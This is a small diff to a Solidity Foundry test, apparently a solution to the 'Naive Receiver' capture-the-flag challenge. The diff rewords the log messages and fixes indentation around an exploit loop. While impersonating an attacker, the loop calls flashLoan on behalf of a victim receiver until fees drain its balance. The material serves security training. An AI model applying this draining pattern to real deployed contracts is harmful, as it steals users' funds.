@@ -50,11 +50,11 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
-        console.log("before", address(flashLoanReceiver).balance);
+        console.log("FLASHLOAN RECEIVER BALANCE BEFORE = ", address(flashLoanReceiver).balance);
         while(address(flashLoanReceiver).balance > 0){
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 10e18);
         }
-        console.log("after", address(flashLoanReceiver).balance);
+        console.log("FLASHLOAN RECEIVER BALANCE AFTER = ", address(flashLoanReceiver).balance);
         vm.stopPrank();
         /**
          * EXPLOIT END *
